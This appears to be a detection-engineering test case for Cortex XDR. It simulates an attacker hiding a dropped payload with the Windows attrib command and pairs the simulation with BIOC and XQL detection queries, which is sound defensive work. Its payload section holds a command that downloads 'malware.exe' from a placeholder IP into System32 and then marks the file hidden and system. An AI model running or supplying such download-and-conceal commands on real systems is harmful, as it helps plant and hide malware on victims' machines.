identity.name: Windows Endpoint: Hidden File Attribute Set via attrib Command
identity.summary: An attacker uses the Windows 'attrib' command to hide a dropped payload by setting the hidden and system attributes on a file in a system directory. Cortex should detect this behavior as a deviation f
identity.description: An attacker uses the Windows 'attrib' command to hide a dropped payload by setting the hidden and system attributes on a file in a system directory. Cortex should detect this behavior as a deviation from normal file attribute modifications.

techniques.name: Hide Artifacts: Hidden Files and Directories

payload.code:
cd C:\Windows\System32
wget http://192.0.2.5/malware.exe -OutFile malware.exe
attrib +h +s malware.exe

expected_artifacts.description: A file with hidden and system attributes set

manual_steps: Not authored. Write and test cleanup before promotion.

biocs.name: Process Start with attrib Command
biocs.description: Detection of the 'attrib' process execution with arguments that set hidden and system flags
biocs.logic:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter action_process_image_name contains 'attrib.exe'
| filter action_process_command_line contains '+h' and action_process_command_line contains '+s'

abiocs.name: Hidden Attribute Set Using attrib
abiocs.description: Detection of file attribute changes using attrib command that sets hidden and system flags
abiocs.logic:
dataset = xdr_data
| filter event_type = ENUM.FILE and event_sub_type = ENUM.FILE_ATTRIBUTE_CHANGED
| filter action_file_attributes contains 'HIDDEN'
| filter action_process_image_name contains 'attrib.exe'

xql_queries.name: Detect Hidden File Attribute Changes
xql_queries.query:
dataset = xdr_data
| filter event_type = ENUM.FILE and event_sub_type = ENUM.FILE_ATTRIBUTE_CHANGED
| filter action_file_attributes contains 'HIDDEN'
| filter action_process_image_name contains 'attrib.exe'
| fields agent_hostname, action_file_path, action_file_attributes, action_process_image_name

analytics_modules: Cortex XSIAM Analytics (XDR Agent) — Hidden Attribute was added to a file using attrib; Required Data: XDR Agent; ATT&CK T1564.001. Ref: cortex-docs.paloaltonetworks.com/analytics-alerts.
